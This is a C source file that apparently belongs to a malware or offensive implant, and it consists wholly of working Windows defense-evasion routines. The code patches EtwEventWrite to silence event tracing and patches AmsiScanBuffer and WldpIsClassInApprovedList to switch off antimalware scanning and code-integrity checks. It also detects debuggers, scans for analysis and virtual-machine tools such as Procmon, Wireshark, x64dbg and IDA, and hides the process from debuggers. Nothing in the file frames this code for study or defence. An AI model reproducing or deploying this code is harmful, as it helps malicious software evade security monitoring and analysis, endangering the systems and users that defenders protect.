#include "defense.h"
#include <tlhelp32.h>
#include <winternl.h>

typedef VOID (NTAPI *pEtwEventWrite)(ULONG64, PULONG64, ULONG, PVOID, PVOID);
typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG);

void EtwPatcher(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    pEtwEventWrite pEtw = (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return;

    DWORD oldProtect;
    VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    BYTE ret = 0xC3;
    memcpy(pEtw, &ret, 1);
    VirtualProtect(pEtw, 1, oldProtect, &oldProtect);
}

void AmsiBypass(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return;

    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
    BYTE patch[] = {0x31, 0xC0, 0xC3};  /* xor eax,eax / ret */
    memcpy(pAmsiScanBuffer, patch, 3);
    VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
}

void WldpBypass(void) {
    HMODULE hWldp = GetModuleHandleA("wldp.dll");
    if (!hWldp) return;

    FARPROC pWldpIsClassInApprovedList = GetProcAddress(hWldp, "WldpIsClassInApprovedList");
    if (!pWldpIsClassInApprovedList) return;

    DWORD oldProtect;
    VirtualProtect(pWldpIsClassInApprovedList, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
    BYTE patch[] = {0x31, 0xC0, 0xC3};
    memcpy(pWldpIsClassInApprovedList, patch, 3);
    VirtualProtect(pWldpIsClassInApprovedList, 3, oldProtect, &oldProtect);
}

int IsBeingDebugged(void) {
    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess pQuery = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!pQuery) return 0;

    DWORD_PTR pbi = 0;
    ULONG len = 0;
    NTSTATUS status = pQuery(GetCurrentProcess(), 0x7, &pbi, sizeof(pbi), &len);
    return (status == 0 && pbi != 0);
}

int DetectAnalysisTools(void) {
    const char *badProcs[] = {
        "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe",
        "wireshark.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
        "ollydbg.exe", "windbg.exe", "processhacker.exe",
        "apimonitor.exe", "autoruns.exe", "Autoruns64.exe",
        "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe",
        NULL
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    int found = 0;

    if (Process32First(hSnap, &pe)) {
        do {
            for (int i = 0; badProcs[i]; i++) {
                if (lstrcmpiA(pe.szExeFile, badProcs[i]) == 0) {
                    found = 1;
                    break;
                }
            }
            if (found) break;
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return found;
}

void HideFromDebugger(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtSetInformationProcess pNtSetInfo = (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    if (pNtSetInfo) {
        DWORD hide = 1;
        pNtSetInfo(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)0x11, &hide, sizeof(hide));
    }
}